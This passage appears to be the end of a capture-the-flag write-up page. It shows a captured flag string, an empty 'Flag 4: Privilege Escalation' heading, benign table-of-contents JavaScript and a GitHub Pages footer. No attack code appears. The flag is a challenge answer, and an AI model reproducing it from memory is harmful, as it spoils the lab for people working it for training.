+RV{lA7ERAl_m0vemenT_I5_a1SO_cOoL_3c69d6d47771c7d7671a5bf3c058e326}
+</code></pre></div></div>
+
+<h1 id="flag-4-privilege-escalation">Flag 4: Privilege Escalation</h1>
+
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+
+        if (content.classList.contains('expanded')) {
+            content.classList.remove('expanded');
+            button.classList.remove('expanded');
+            button.innerHTML = 'Table of Contents';
+        } else {
+            content.classList.add('expanded');
+            button.classList.add('expanded');
+            button.innerHTML = 'Table of Contents';
+        }
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        miniToc.classList.toggle('minimized');
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        
+        const existingToc = document.querySelector('.toc-content');
+        
+        if (existingToc && existingToc.innerHTML.trim()) {
+            const tocClone = existingToc.cloneNode(true);
+            
+            tocClone.classList.remove('toc-content', 'expanded');
+            tocClone.removeAttribute('id');
+            
+            const links = tocClone.querySelectorAll('a');
+            links.forEach(link => {
+                link.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const href = link.getAttribute('href');
+                    if (href && href.startsWith('#')) {
+                        const targetElement = document.querySelector(href);
+                        if (targetElement) {
+                            targetElement.scrollIntoView({
+                                behavior: 'smooth',
+                                block: 'start'
+                            });
+                        }
+                    }
+                });
+            });
+            
+            miniTocContent.appendChild(tocClone);
+            miniToc.classList.add('visible');
+            
+            setupActiveHighlighting(links);
+        } else {
+            generateTocFromHeadings();
+        }
+    }
+
+    function generateTocFromHeadings() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const headings = document.querySelectorAll('h1, h2, h3, h4, h5, h6');
+        
+        if (headings.length === 0) {
+            return;
+        }
+
+        const ul = document.createElement('ul');
+        
+        headings.forEach((heading, index) => {
+            if (!heading.id) {
+                heading.id = `heading-${index}`;
+            }
+
+            const li = document.createElement('li');
+            const a = document.createElement('a');
+            a.href = `#${heading.id}`;
+            a.textContent = heading.textContent;
+            
+            li.appendChild(a);
+            ul.appendChild(li);
+        });
+
+        miniTocContent.appendChild(ul);
+        miniToc.classList.add('visible');
+
+        ul.addEventListener('click', (e) => {
+            if (e.target.tagName === 'A') {
+                e.preventDefault();
+                const targetId = e.target.getAttribute('href').substring(1);
+                const targetElement = document.getElementById(targetId);
+                if (targetElement) {
+                    targetElement.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            }
+        });
+
+        setupActiveHighlighting(ul.querySelectorAll('a'));
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                return {
+                    link: link,
+                    element: document.querySelector(href)
+                };
+            }
+            return null;
+        }).filter(item => item && item.element);
+
+        if (targets.length === 0) return;
+
+        function updateActiveSection() {
+            const scrollPosition = window.scrollY + 100;
+            let activeTarget = null;
+
+            targets.forEach(target => {
+                if (target.element.offsetTop <= scrollPosition) {
+                    activeTarget = target;
+                }
+            });
+
+            links.forEach(link => {
+                link.classList.remove('active');
+            });
+
+            if (activeTarget) {
+                activeTarget.link.classList.add('active');
+            }
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => {
+                    updateActiveSection();
+                    ticking = false;
+                });
+                ticking = true;
+            }
+        });
+
+        updateActiveSection();
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/ASYNC-Security">ASYNC-Security</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
